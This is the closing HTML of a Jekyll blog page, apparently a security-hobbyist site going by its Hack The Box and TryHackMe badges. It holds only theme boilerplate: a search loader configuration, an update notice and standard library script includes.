  <div class="mt-auto d-flex flex-wrap justify-content-center align-items-center">
    <script src="https://www.hackthebox.eu/badge/1256978"></script>
    <script src="https://tryhackme.com/badge/50213"></script>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

